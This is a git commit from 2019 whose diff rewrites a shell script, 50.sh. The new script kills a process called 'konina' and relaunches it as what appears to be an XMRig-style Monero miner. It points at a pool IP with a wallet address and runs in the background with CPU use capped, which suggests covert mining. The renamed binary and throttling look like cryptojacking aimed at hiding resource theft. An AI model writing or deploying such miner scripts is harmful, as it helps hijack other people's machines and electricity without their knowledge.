54bbd2bfa3b2fe7ea8b8e783eeddb3040e1bcc27
maks54rus <49484189+maks54rus@users.noreply.github.com>
2019-04-19 05:39:41 +0700

    Update 50.sh

--- 50.sh
+++ 50.sh
@@ -1,1 +1,3 @@
-hh
+pkill konina
+sleep 7
+konina -o 95.216.214.218:5755 -u 4AvKpmkjuJUVxTYTRR4TwzFniizuQ3EuzVSvgtjDiTfuPDFEGEMd92q2CSKCiBvASLbWeSvC16Wn7PejdxEzszbdVZWK1Qj --pass=12:koot@usa.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=47 --av=1 --variant -1
